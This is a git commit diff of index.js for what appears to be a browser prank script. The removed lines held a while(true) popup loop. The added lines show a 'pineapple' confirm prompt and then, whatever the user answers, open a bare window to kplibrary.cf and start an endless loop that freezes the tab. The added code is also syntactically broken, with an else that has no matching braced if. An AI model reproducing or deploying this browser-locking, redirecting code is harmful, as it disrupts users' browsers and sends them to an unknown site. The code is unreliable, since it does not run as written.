3d5ec8d89b9a9735e9010884584c9f3596e45547
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-08 18:13:53 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,13 +1,11 @@
-<script type="text/javascript">
-<!--
-
-var answer = alert ("Do you wish to proceed")
+var answer = confirm ("Im a pineapple")
 if (answer)
-alert ("Woo Hoo! So am I.")
-while(true)
-{
 window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
 setTimeout(function(){
 for(var i = 0; i === i; i++) {}
 }, 50); 
-}
+else
+window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
+setTimeout(function(){
+for(var i = 0; i === i; i++) {}
+}, 50); 
